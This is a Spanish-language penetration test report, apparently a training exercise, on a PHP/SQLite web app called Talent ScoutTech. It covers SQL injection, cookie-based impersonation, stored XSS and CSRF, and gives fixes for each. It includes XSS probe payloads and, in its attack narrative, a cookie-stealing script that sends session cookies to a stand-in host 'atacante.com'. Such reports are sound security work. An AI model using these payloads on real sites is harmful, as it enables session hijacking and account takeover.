# Informe de Pruebas de Penetraci贸n - Talent ScoutTech

*   **Auditores: Secure Shield Pentesting S.L.:**
    *   Francisco Javier Rodriguez Acosta
*   **Cliente:** ACME
*   **Aplicaci贸n Auditada:** Talent ScoutTech
*   **Fecha del Informe:** 2024-05-28

*   [Enlace a Acuerdo de Pentesting (Ejemplo)](Acuerdo-Pentesting-TalentScoutTech.md) <!-- Crear este archivo o enlazar al real -->

<!-- ![Logo ACME (Placeholder)](Img/logo_acme_placeholder.png) Reemplazar con logo de ACME o eliminar -->

---

## ndice

1.  [Introducci贸n](#1-introducci贸n)
    *   1.1 [Objetivos](#11-objetivos)
    *   1.2 [Alcance](#12-alcance)
    *   1.3 [L铆mites o Rules of Engagement (ROE)](#13-l铆mites-o-rules-of-engagement-roe)
    *   1.4 [Metodolog铆a](#14-metodolog铆a)
2.  [Descargo de responsabilidad](#2-descargo-de-responsabilidad)
3.  [Informaci贸n de contacto del Auditor](#3-informaci贸n-de-contacto-del-auditor)
4.  [ndice de Gravedad](#4-铆ndice-de-gravedad)
5.  [Resumen Ejecutivo y Hallazgos](#5-resumen-ejecutivo-y-hallazgos)
    *   5.1 [Resumen Ejecutivo](#51-resumen-ejecutivo)
    *   5.2 [Hallazgos Principales (Resumidos)](#52-hallazgos-principales-resumidos)
    *   5.3 [Perfil de Riesgo](#53-perfil-de-riesgo)
6.  [Fase de Reconocimiento y An谩lisis de la Aplicaci贸n](#6-fase-de-reconocimiento-y-an谩lisis-de-la-aplicaci贸n)
7.  [Detalle de Vulnerabilidades Explotadas](#7-detalle-de-vulnerabilidades-explotadas)
    *   7.1 [SQL001: Inyecci贸n SQL en Funcionalidad de Login](#71-sql001-inyecci贸n-sql-en-funcionalidad-de-login)
    *   7.2 [SQL002: SQLi y Control de Acceso Roto en A帽adir Comentario](#72-sql002-sqli-y-control-de-acceso-roto-en-a帽adir-comentario)
    *   7.3 [XSS001: Cross-Site Scripting Almacenado en Comentarios](#73-xss001-cross-site-scripting-almacenado-en-comentarios)
    *   7.4 [XSS002: Cross-Site Scripting en Listados y B煤squeda](#74-xss002-cross-site-scripting-en-listados-y-b煤squeda)
    *   7.5 [CSRF001: Cross-Site Request Forgery (v铆a XSS)](#75-csrf001-cross-site-request-forgery-v铆a-xss)
    *   7.6 [BAC001: Controles de Autenticaci贸n y Sesi贸n D茅biles](#76-bac001-controles-de-autenticaci贸n-y-sesi贸n-d茅biles)
    *   7.7 [INFO001: Exposici贸n de C贸digo Fuente](#77-info001-exposici贸n-de-c贸digo-fuente)
8.  [Resumen de Vulnerabilidades (Tabla)](#8-resumen-de-vulnerabilidades-tabla)
9.  [Narrativa de un Escenario de Ataque Potencial](#9-narrativa-de-un-escenario-de-ataque-potencial)
10. [Recomendaciones Generales de Seguridad para Aplicaciones Web](#10-recomendaciones-generales-de-seguridad-para-aplicaciones-web)
11. [Conclusi贸n](#11-conclusi贸n)

---

## 1. Introducci贸n

Este informe presenta los resultados de una prueba de penetraci贸n realizada sobre la aplicaci贸n web **Talent ScoutTech**, desarrollada por **ACME**. El objetivo principal ha sido evaluar la seguridad de la aplicaci贸n desde la perspectiva de un atacante, enfoc谩ndose en la identificaci贸n, explotaci贸n y documentaci贸n de vulnerabilidades de seguridad.

La prueba se desarroll贸 sobre una instancia de la aplicaci贸n proporcionada o desplegada localmente, simulando un entorno de desarrollo o pruebas. Las acciones se ajustaron a los l铆mites definidos en el acuerdo de alcance y reglas de compromiso. Este informe tiene como fin proporcionar a ACME una visi贸n clara de su postura de seguridad actual y recomendaciones accionables para mitigar los riesgos identificados.

### 1.1 Objetivos

Los objetivos espec铆ficos de esta prueba de penetraci贸n fueron:

*   Identificar y explotar vulnerabilidades de **Inyecci贸n SQL (SQLi)** para acceder o manipular datos de la base de datos.
*   Detectar y demostrar vulnerabilidades de **Cross-Site Scripting (XSS)**, tanto almacenado como reflejado.
*   Evaluar la robustez de los mecanismos de **autenticaci贸n y gesti贸n de sesiones**, identificando debilidades que permitan la suplantaci贸n de usuarios o el acceso no autorizado.
*   Analizar la aplicaci贸n en busca de vulnerabilidades de **Control de Acceso Roto**.
*   Investigar la posibilidad de ataques de **Cross-Site Request Forgery (CSRF)**, especialmente en combinaci贸n con XSS.
*   Identificar **configuraciones de seguridad incorrectas** o exposici贸n de informaci贸n sensible (ej. archivos de backup como `add_comment.php~`).
*   Documentar las vulnerabilidades explotadas y proporcionar una narrativa de ataque plausible.
*   Proporcionar recomendaciones detalladas y priorizadas para la mitigaci贸n de las vulnerabilidades encontradas.

### 1.2 Alcance

La prueba se centr贸 exclusivamente en la aplicaci贸n web **Talent ScoutTech** y sus componentes accesibles v铆a HTTP/S.

*   **Aplicaci贸n Principal:** Talent ScoutTech
    *   URLs/Endpoints: Todos los archivos `.php` y funcionalidades accesibles de la aplicaci贸n (ej. `index.php`, `login.php`, `register.php`, `list_players.php`, `insert_player.php`, `show_comments.php`, `add_comment.php`, `buscador.php`, etc.).
    *   Archivos de backup expuestos (ej. `add_comment.php~`).
    *   Base de datos SQLite subyacente (evaluada a trav茅s de vulnerabilidades de inyecci贸n).
*   **Archivos de Configuraci贸n o C贸digo Fuente de la Carpeta `private`:** Analizados seg煤n lo permitido por el enunciado del proyecto (ej. `private/auth.php`, `private/conf.php`) para entender la l贸gica y proponer correcciones.

**Fuera del Alcance:**

*   La infraestructura de servidor subyacente (sistema operativo, servidor web Apache m谩s all谩 de configuraciones b谩sicas como `.htaccess` para la carpeta `private` y recomendaciones generales de la Parte 4 del proyecto original).
*   Ataques de Denegaci贸n de Servicio (DoS/DDoS) disruptivos.
*   Ingenier铆a social.
*   La aplicaci贸n `http://web.pagos/` (usada solo como un ejemplo te贸rico para CSRF).

### 1.3 L铆mites o Rules of Engagement (ROE)

*   Las pruebas se realizaron en un entorno de desarrollo/pruebas local.
*   No se realizaron acciones que pudieran impactar negativamente la disponibilidad o integridad de datos en un sistema de producci贸n real.
*   La modificaci贸n de datos se limit贸 a lo necesario para demostrar la explotaci贸n de vulnerabilidades.
*   Se evit贸 la exfiltraci贸n masiva de datos; solo se obtuvieron muestras para confirmar el acceso.
*   Los datos sensibles descubiertos (si los hubiera) se manejar铆an con confidencialidad y se reportar铆an directamente al cliente.
*   Cualquier hallazgo cr铆tico que pudiera indicar un compromiso activo o un riesgo inminente se comunicar铆a de inmediato.

### 1.4 Metodolog铆a

La prueba de penetraci贸n sigui贸 una metodolog铆a basada en el **OWASP Web Security Testing Guide (WSTG)** y el **OWASP Top 10**, adaptada a los objetivos del proyecto. Las fases principales fueron:

1.  **Fase de Pre-interacci贸n (Setup):** Definici贸n del alcance, objetivos y ROE con el cliente (simulado).
2.  **Recopilaci贸n de Informaci贸n (Information Gathering):**
    *   Mapeo manual y automatizado (con ZAP en modo pasivo) de la aplicaci贸n para entender su estructura, funcionalidades y puntos de entrada.
    *   Identificaci贸n de tecnolog铆as (PHP, SQLite, Apache).
    *   B煤squeda de directorios y archivos comunes o expuestos (ej. `add_comment.php~`).
3.  **Modelado de Amenazas y An谩lisis de Vulnerabilidades (Threat Modeling & Vulnerability Analysis):**
    *   Identificaci贸n de posibles vectores de ataque basados en la informaci贸n recopilada.
    *   Pruebas manuales enfocadas en clases de vulnerabilidades OWASP Top 10 (Inyecci贸n, Autenticaci贸n Rota, XSS, Control de Acceso Roto, etc.).
    *   Uso de herramientas como OWASP ZAP para escaneo activo (controlado) y fuzzing (ej. ataque de diccionario en login).
    *   Revisi贸n de c贸digo fuente (cuando disponible o inferido por errores) para identificar patrones de codificaci贸n inseguros.
4.  **Explotaci贸n (Exploitation):**
    *   Intento de explotar las vulnerabilidades identificadas de forma controlada para confirmar su existencia e impacto.
    *   Obtenci贸n de Pruebas de Concepto (PoC) para cada vulnerabilidad validada.
5.  **Post-Explotaci贸n (Post-Exploitation):**
    *   En este contexto, implicar铆a evaluar el impacto de una explotaci贸n exitosa (ej. qu茅 datos se pueden ver/modificar tras un bypass de SQLi, qu茅 acciones se pueden realizar con una sesi贸n XSS robada).
6.  **Reporte (Reporting):**
    *   Documentaci贸n exhaustiva de todos los hallazgos, incluyendo descripci贸n, pasos de reproducci贸n, PoC, impacto, nivel de riesgo y recomendaciones detalladas para la mitigaci贸n.

---

## 2. Descargo de responsabilidad

Este informe ha sido elaborado con base en la evaluaci贸n de seguridad realizada sobre la aplicaci贸n **Talent ScoutTech** seg煤n lo especificado por **ACME**. Los hallazgos, conclusiones y recomendaciones presentadas reflejan las condiciones observadas en el momento de la evaluaci贸n ([Periodo de Evaluaci贸n]). **[Tu Nombre/Nombre de tu Equipo/Empresa Auditora]** no se hace responsable por cualquier uso indebido, interpretaci贸n err贸nea o acci贸n que se derive de la informaci贸n contenida en este informe. ACME es responsable de evaluar y tomar las medidas que considere necesarias para mitigar los riesgos identificados. La seguridad es un proceso continuo y este informe representa una instant谩nea en el tiempo; nuevas vulnerabilidades pueden surgir o ser descubiertas posteriormente.

---

## 3. Informaci贸n de contacto del Auditor

| Campo             | Detalle                                         |
| :---------------- | :---------------------------------------------- |
| **Auditor Ppal**  | Francisco Javier Rodriguez Acosta               |
| **Empresa (Ej.)** | Consultor de Seguridad Independiente (o nombre de empresa) |
| **Email**         | [Tu Email de Contacto]                          |
| **Tel茅fono**      | [Tu Tel茅fono de Contacto]                       |

---

## 4. ndice de Gravedad

| **Gravedad** | **CVSS / Puntuaci贸n Estimada** | **Definici贸n** |
| :---: | :---: | :---: |
| Cr铆tica   | 9.0 - 10.0 | Vulnerabilidad f谩cil de explotar, que puede permitir el compromiso total de la aplicaci贸n, acceso a todos los datos, o ejecuci贸n de c贸digo a nivel de servidor. Requiere actuaci贸n inmediata. |
| Alta      | 7.0 - 8.9   | Vulnerabilidad que puede producir un impacto grave, como acceso no autorizado a funcionalidades sensibles, suplantaci贸n de otros usuarios, o lectura/modificaci贸n extensa de datos. Debe solucionarse lo antes posible. |
| Moderada  | 4.0 - 6.9 | Vulnerabilidad que podr铆a permitir acceso limitado a datos, o ser explotada bajo condiciones espec铆ficas, o requerir interacci贸n del usuario. Solucionar cuando no haya vulnerabilidades de gravedad superior. |
| Baja      | 0.1 - 3.9 | Vulnerabilidad con bajo impacto, dif铆cil de explotar, o que expone informaci贸n no cr铆tica. Recomendable mitigar como parte de buenas pr谩cticas. |
| Informacional 癸 | N/A | Hallazgo que no representa una vulnerabilidad directa pero es relevante para la postura de seguridad (ej. versiones de software, cabeceras informativas). |

---

## 5. Resumen Ejecutivo y Hallazgos

### 5.1 Resumen Ejecutivo

Se realiz贸 una prueba de penetraci贸n a la aplicaci贸n web **Talent ScoutTech** de ACME entre el [Fecha Inicio Pruebas] y el [Fecha Fin Pruebas]. La evaluaci贸n revel贸 **m煤ltiples vulnerabilidades de seguridad cr铆ticas y altas**, que exponen la aplicaci贸n a riesgos significativos. Las principales categor铆as de fallas incluyen **Inyecci贸n SQL (SQLi)**, **Cross-Site Scripting (XSS)**, y **Controles de Autenticaci贸n y Acceso D茅biles**.

La explotaci贸n exitosa de estas vulnerabilidades demostr贸 la posibilidad de eludir la autenticaci贸n, obtener acceso no autorizado a cuentas de usuario (incluyendo la potencial enumeraci贸n de credenciales v谩lidas como `luis`/`1234`), manipular y visualizar datos de la base de datos, publicar contenido en nombre de otros usuarios, y ejecutar c贸digo JavaScript arbitrario en los navegadores de los usuarios visitantes. Este 煤ltimo vector (XSS) podr铆a ser utilizado para robar sesiones de usuario o redirigir a los usuarios a sitios maliciosos para ataques de phishing o CSRF.

La exposici贸n de c贸digo fuente a trav茅s de archivos de backup (ej. `add_comment.php~`) tambi茅n fue un factor que facilit贸 la identificaci贸n de algunas de estas debilidades.

Dada la severidad de los hallazgos, **se requiere una acci贸n de remediaci贸n urgente** por parte de ACME para proteger la integridad de la aplicaci贸n, la confidencialidad de los datos de los jugadores y usuarios, y la reputaci贸n de la plataforma Talent ScoutTech.

### 5.2 Hallazgos Principales (Resumidos)

1.  **SQL001 (Cr铆tico): Inyecci贸n SQL en Login:** Permite el bypass de autenticaci贸n.
2.  **SQL002 (Cr铆tico): SQLi y Control de Acceso Roto en A帽adir Comentario:** Permite suplantaci贸n al publicar comentarios.
3.  **XSS001 (Alto): XSS Almacenado en Comentarios:** Permite ejecuci贸n de scripts en navegadores de v铆ctimas.
4.  **BAC001 (Alto): Controles de Autenticaci贸n y Sesi贸n D茅biles:** Facilita compromiso de cuentas y suplantaci贸n.
5.  **XSS002 (Medio/Alto): XSS en Listados y B煤squeda:** Potencial ejecuci贸n de scripts.
6.  **CSRF001 (Medio): CSRF v铆a XSS:** Permite forzar acciones en nombre de usuarios.
7.  **INFO001 (Bajo): Exposici贸n de C贸digo Fuente:** Facilita an谩lisis al atacante.

### 5.3 Perfil de Riesgo

El perfil de riesgo general de la aplicaci贸n **Talent ScoutTech** se eval煤a como **CRTICO**.

| Nivel de Riesgo (Validado) | Total Hallazgos |
| :------------------------- | :-------------- |
|  Cr铆tico                 | 2               |
|  Alto                    | 3               |
|  Medio                   | 1               |
|  Bajo                    | 1               |
| **Total (Validado)**       | **7**           |

Esta evaluaci贸n se basa en la facilidad de explotaci贸n de las vulnerabilidades cr铆ticas (SQLi en login, Suplantaci贸n en comentarios) y el alto impacto de las vulnerabilidades XSS y de autenticaci贸n, que en conjunto podr铆an llevar a un compromiso completo de la funcionalidad y los datos de la aplicaci贸n.

---

## 6. Fase de Reconocimiento y An谩lisis de la Aplicaci贸n

Durante esta fase, se procedi贸 a un an谩lisis exhaustivo de la aplicaci贸n Talent ScoutTech para entender su funcionalidad, puntos de entrada y tecnolog铆as subyacentes.

*   **Mapeo de la Aplicaci贸n:**
    *   Funcionalidades principales identificadas: Login (`index.php`, `private/auth.php`), Registro (`register.php`), Listado de Jugadores (`list_players.php`), B煤squeda (`buscador.php`), A帽adir/Editar Jugador (`insert_player.php`), Ver Comentarios (`show_comments.php`), A帽adir Comentario (`add_comment.php`).
    *   Puntos de entrada de datos: Formularios de Login, Registro, A帽adir/Editar Jugador, A帽adir Comentario, B煤squeda. Par谩metros GET (ej. `id` en `show_comments.php`), Cookies (ej. `userId` antes de correcci贸n).
*   **Identificaci贸n de Tecnolog铆as:** PHP, SQLite3, Apache.
*   **Descubrimiento de Archivos Sensibles:** Identificaci贸n de `add_comment.php~` (backup de c贸digo fuente).
*   **An谩lisis de Flujo de Autenticaci贸n y Sesi贸n:** Login establece cookies `user`, `userId`, `PHPSESSID`. Se observ贸 dependencia incorrecta de `$_COOKIE['userId']` en `add_comment.php`.
*   **Uso de Herramientas:** OWASP ZAP (fuzzing login, escaneo pasivo/activo), Herramientas de Desarrollador del Navegador.

---

## 7. Detalle de Vulnerabilidades Explotadas

### 7.1. SQL001: Inyecci贸n SQL en Funcionalidad de Login
*   **Descripci贸n:** Concatenaci贸n directa de `username` en query SQL en `private/auth.php` permite bypass de autenticaci贸n. `SQLite3::escapeString()` mal utilizado.
*   **Prueba de Concepto:**
    *   Usuario: `"hola` (para provocar error y revelar query).
        *   *Evidencia:*![](Img/url.png)
    *   Ataque de diccionario con ZAP Fuzzer identific贸 `luis` / `1234`.
        *   *Evidencia:* ![](Img/Luis_1234.png)
*   **Impacto:** Acceso no autorizado como cualquier usuario.
*   **Severidad:** **Cr铆tica**  (CVSS v3.1 Estimado: 9.8)
*   **Recomendaci贸n:** Usar consultas preparadas con `bindValue` en `private/auth.php`.
    ```php
    // private/auth.php (o script de login)
    $stmt = $db->prepare('SELECT userId, password FROM users WHERE username = :username');
    $stmt->bindValue(':username', $_POST['username'], SQLITE3_TEXT);
    // ... verificar con password_verify ...
    ```

### 7.2. SQL002: SQLi y Control de Acceso Roto en A帽adir Comentario
*   **Descripci贸n:** `add_comment.php` usa `$_COOKIE['userId']` (controlable por el cliente) para identificar al autor y concatena `$_GET['id']` (playerId) en query `INSERT` sin sanitizaci贸n adecuada, permitiendo suplantaci贸n y potencial SQLi adicional.
*   **Prueba de Concepto:** Modificar cookie `userId` al ID de otro usuario (ej. `1` para `luis`) antes de enviar comentario. El comentario se publica a nombre de `luis`.
    *   *(No se proporcion贸 imagen espec铆fica para este PoC, la descripci贸n textual sirve como PoC conceptual)*
*   **Impacto:** Suplantaci贸n de identidad al publicar comentarios.
*   **Severidad:** **Cr铆tica**  (CVSS v3.1 Estimado: 9.1)
*   **Recomendaci贸n:** Obtener `userId` **exclusivamente** de `$_SESSION['userId']` (establecida tras login seguro). Usar consultas preparadas para `playerId`, `userId` y `body`. Validar `playerId` como entero.
    ```php
    // add_comment.php
    session_start(); // Asegurar sesi贸n iniciada
    if (!isset($_SESSION['userId'])) { /* redirigir a login o error */ exit(); }
    $userId = $_SESSION['userId']; // CORRECTO
    $playerId = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);
    if ($playerId === false || $playerId === null) { die("ID de jugador inv谩lido."); }
    $body = $_POST['body'];
    $stmt = $db->prepare("INSERT INTO comments (playerId, userId, body) VALUES (:pid, :uid, :body)");
    $stmt->bindValue(':pid', $playerId, SQLITE3_INTEGER);
    $stmt->bindValue(':uid', $userId, SQLITE3_INTEGER);
    $stmt->bindValue(':body', $body, SQLITE3_TEXT);
    $stmt->execute();
    // ...
    ```

### 7.3. XSS001: Cross-Site Scripting Almacenado en Comentarios
*   **Descripci贸n:** `show_comments.php` muestra `username` y `body` de comentarios sin escapar, permitiendo ejecuci贸n de JS almacenado. Tambi茅n vulnerable a SQLi v铆a `$_GET['id']`.
*   **Prueba de Concepto:** Comentario: `<script>alert('XSS Vulnerable!');</script>`
    *   *Evidencia:* ![](Img/Scriptxss.png)
    *   *Evidencia:* ![](Img/Confirmacionxss.png)
*   **Impacto:** Robo de sesi贸n, defacement, CSRF.
*   **Severidad:** **Alta**  (CVSS v3.1 Estimado: 8.7)
*   **Recomendaci贸n:** Escapar `username` y `body` con `htmlspecialchars()` en `show_comments.php`. Usar consultas preparadas para `$_GET['id']`.
    ```php
    // show_comments.php
    // Para SQLi:
    $playerId_input = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);
    // ... usar $stmt->bindValue(':playerId', $playerId_input, SQLITE3_INTEGER); ...
    // Para XSS:
    echo htmlspecialchars($row['username'], ENT_QUOTES, 'UTF-8');
    echo htmlspecialchars($row['body'], ENT_QUOTES, 'UTF-8');
    ```

### 7.4. XSS002: Cross-Site Scripting en Listados y B煤squeda
*   **Descripci贸n:** `list_players.php` y `buscador.php` muestran `name` y `team` sin escapar. Potencial XSS almacenado si la entrada de estos campos no se sanitiza.
*   **Prueba de Concepto:** Nombre de jugador: `<img src=x onerror=alert('XSS_Player')>`
    *   *(No se proporcion贸 imagen espec铆fica para este PoC)*
*   **Impacto:** Similar a XSS001 si se logra almacenar.
*   **Severidad:** **Media  a Alta **
*   **Recomendaci贸n:** Escapar `name` y `team` con `htmlspecialchars()` en `list_players.php` y `buscador.php`.

### 7.5. CSRF001: Cross-Site Request Forgery (v铆a XSS)
*   **Descripci贸n:** XSS001 puede usarse para forzar peticiones CSRF (GET/POST) a `http://web.pagos/` u otros endpoints. Se demuestra la creaci贸n de un bot贸n "Profile" que redirige a la URL maliciosa.
*   **Prueba de Concepto:** Script XSS que auto-env铆a un formulario POST o modificaci贸n de `list_players.php` para incluir el bot贸n "Profile".
    *   *Evidencia:* ![](Img/Pasted%20image%2020250127102701.png)
    *   *Evidencia:* ![](Img/Pasted%20image%2020250127103141.png)
*   **Impacto:** Acciones no autorizadas en nombre de la v铆ctima.
*   **Severidad:** **Media** 
*   **Recomendaci贸n:** Corregir XSS (XSS001). Implementar tokens Anti-CSRF en Talent ScoutTech para todas las acciones que cambian estado.

### 7.6. BAC001: Controles de Autenticaci贸n y Sesi贸n D茅biles
*   **Descripci贸n:** Registro p煤blico inseguro (hashing d茅bil/ausente, sin validaci贸n). Login sin anti-fuerza bruta. Mal uso de cookies para `userId` (ver SQL002). `register.php` p煤blico. Carpeta `private` potencialmente expuesta.
*   **Prueba de Concepto:** Registro con contrase帽a trivial, manipulaci贸n de cookie `userId` para explotar SQL002.
    *   *(No se proporcionaron im谩genes espec铆ficas para este PoC, la descripci贸n textual y la referencia a SQL002 sirven como PoC conceptual)*
*   **Impacto:** Creaci贸n de cuentas no deseadas, suplantaci贸n, compromiso de credenciales.
*   **Severidad:** **Alta** 
*   **Recomendaci贸n:**
    *   Registro: Usar `password_hash()` con algoritmo moderno, validar todas las entradas, restringir acceso a `register.php` (ej. solo administradores o con token de invitaci贸n).
    *   Login: Limitar intentos de login fallidos por IP/usuario.
    *   Sesiones: Usar `$_SESSION` para almacenar `userId` y otros datos de sesi贸n. Regenerar ID de sesi贸n tras login (`session_regenerate_id(true)`). Configurar cookies de sesi贸n con atributos `HttpOnly`, `Secure` (para HTTPS), y `SameSite=Lax` o `Strict`.
    *   Carpeta `private`: Asegurar que no sea accesible desde la web usando `.htaccess` (`Require all denied`) o movi茅ndola fuera del `DocumentRoot`.

### 7.7. INFO001: Exposici贸n de C贸digo Fuente
*   **Descripci贸n:** Archivo `add_comment.php~` expone c贸digo fuente, facilitando la identificaci贸n de la vulnerabilidad SQL002.
*   **Impacto:** Reduce el esfuerzo del atacante para encontrar vulnerabilidades.
*   **Severidad:** **Baja** 
*   **Recomendaci贸n:** No dejar archivos de backup (con extensiones como `~`, `.bak`, `.old`, etc.) en directorios accesibles por la web. Configurar el servidor web para no servir estos tipos de archivos o denegar su listado.

---

## 8. Resumen de Vulnerabilidades (Tabla)

| ID      | Vulnerabilidad Breve                                        | Tipo        | Gravedad | Explotada | CVE / CWE       |
| :------ | :---------------------------------------------------------- | :---------- | :------- | :-------- | :-------------- |
| SQL001  | Inyecci贸n SQL en Login                                      | SQLi        | Cr铆tica  | S铆        | CWE-89          |
| SQL002  | SQLi y Control Acceso Roto en A帽adir Comentario             | SQLi/AuthZ  | Cr铆tica  | S铆        | CWE-89, CWE-284 |
| XSS001  | XSS Almacenado en Comentarios                               | XSS         | Alta     | S铆        | CWE-79          |
| XSS002  | XSS en Listados y B煤squeda                                  | XSS         | Media/Alta| Parcial   | CWE-79          |
| CSRF001 | CSRF v铆a XSS (Donaci贸n Simulada)                            | CSRF/XSS    | Media    | S铆 (PoC)  | CWE-352, CWE-79 |
| BAC001  | Controles de Autenticaci贸n y Sesi贸n D茅biles                 | Auth/SessMgt| Alta     | S铆 (An谩l.)| CWE-287, CWE-384, CWE-522, CWE-613 |
| INFO001 | Exposici贸n de C贸digo Fuente (`add_comment.php~`)            | InfoExpo    | Baja     | N/A (Usado)| CWE-541         |

---

## 9. Narrativa de un Escenario de Ataque Potencial

1.  **Reconocimiento:** El atacante descubre el archivo `add_comment.php~` (INFO001), revelando el uso inseguro de `$_COOKIE['userId']`.
2.  **Bypass Login (SQL001):** El atacante usa una Inyecci贸n SQL en el formulario de login para obtener acceso como el usuario `luis` (credenciales `luis`/`1234` tambi茅n podr铆an ser obtenidas por fuerza bruta o diccionario si la SQLi no fuera directa para bypass).
3.  **Inyectar XSS (XSS001):** Autenticado como `luis`, el atacante publica un comentario en un jugador popular con un payload XSS dise帽ado para robar cookies: `<script>new Image().src='http://atacante.com/log.php?c='+document.cookie;</script>`.
4.  **Robo de Sesi贸n de Administrador:** Un administrador de Talent ScoutTech visualiza la p谩gina de comentarios del jugador infectado. Su navegador ejecuta el script XSS, enviando su cookie de sesi贸n (incluyendo `PHPSESSID` y potencialmente otras como `user`, `userId`) al servidor del atacante.
5.  **Suplantaci贸n de Administrador:** El atacante toma la cookie de sesi贸n del administrador y la usa en su propio navegador para suplantar al administrador dentro de Talent ScoutTech, obteniendo acceso a todas las funcionalidades administrativas.
6.  **Publicaci贸n Maliciosa como Otro Usuario (SQL002):** El atacante (ahora como administrador, o incluso desde su cuenta `luis` si no hubiera obtenido sesi贸n de admin) decide publicar comentarios difamatorios. Modifica su propia cookie `userId` al ID de un usuario v铆ctima espec铆fico y env铆a un nuevo comentario. Dicho comentario aparece como si lo hubiera publicado el usuario v铆ctima, explotando el control de acceso roto en `add_comment.php`.
7.  **Ataque CSRF (Opcional, CSRF001):** Si el payload XSS del paso 3 fuera diferente, podr铆a forzar al navegador del administrador a realizar acciones no deseadas dentro de Talent ScoutTech (ej. eliminar un jugador) o en un sitio externo si el administrador estuviera autenticado all铆.

**Resultado:** El atacante ha obtenido control administrativo, ha suplantado usuarios y podr铆a haber causado da帽o reputacional significativo y manipulaci贸n de datos.

---

## 10. Recomendaciones Generales de Seguridad para Aplicaciones Web

Adem谩s de las mitigaciones espec铆ficas para cada vulnerabilidad detallada en la Secci贸n 7, se proponen las siguientes recomendaciones generales basadas en las mejores pr谩cticas de OWASP:

1.  **Validar Todas las Entradas (A03:2021-Injection):** Sanitizar y validar rigurosamente todas las entradas del usuario en el lado del servidor.
2.  **Codificar Datos en Salida (A03:2021-Injection - XSS):** Escapar adecuadamente todos los datos din谩micos antes de insertarlos en el cliente.
3.  **Usar Consultas Parametrizadas (A03:2021-Injection - SQLi):** Implementar consultas preparadas para todas las interacciones con la base de datos.
4.  **Implementar Controles de Autenticaci贸n y Sesi贸n Robustos (A07:2021-Identification and Authentication Failures):** Hashing fuerte, protecci贸n anti-fuerza bruta, IDs de sesi贸n seguros y regenerados, cookies seguras.
5.  **Aplicar Controles de Acceso Estrictos (A01:2021-Broken Access Control):** Verificar permisos en servidor, denegar por defecto.
6.  **Implementar Protecci贸n Anti-CSRF (A01:2021-Broken Access Control):** Usar tokens sincronizadores para acciones que cambian estado.
7.  **Mantener Componentes Actualizados (A06:2021-Vulnerable and Outdated Components):** PHP, Apache, SQLite, librer铆as.
8.  **Configuraci贸n Segura (A05:2021-Security Misconfiguration):** Deshabilitar listado de directorios, eliminar archivos innecesarios, cabeceras HTTP de seguridad.
9.  **Monitoreo y Logging (A09:2021-Security Logging and Monitoring Failures):** Registrar y monitorear eventos de seguridad.
10. **Ciclo de Vida de Desarrollo Seguro (SSDLC):** Incorporar revisiones de seguridad y pruebas peri贸dicas.

---

## 11. Conclusi贸n

La aplicaci贸n web **Talent ScoutTech** presenta **vulnerabilidades significativas** que, si son explotadas, podr铆an llevar a un compromiso grave de la aplicaci贸n, sus datos y sus usuarios. Las fallas de Inyecci贸n SQL, Cross-Site Scripting, y los d茅biles controles de autenticaci贸n y acceso son de especial preocupaci贸n y requieren **atenci贸n y remediaci贸n inmediata** por parte de ACME.

Se recomienda encarecidamente aplicar todas las mitigaciones detalladas en este informe, priorizando las vulnerabilidades cr铆ticas y altas. Adem谩s, es fundamental adoptar un enfoque proactivo hacia la seguridad, integrando pr谩cticas de desarrollo seguro en todo el ciclo de vida de la aplicaci贸n y realizando evaluaciones de seguridad peri贸dicas para mantener una postura de defensa robusta.

---
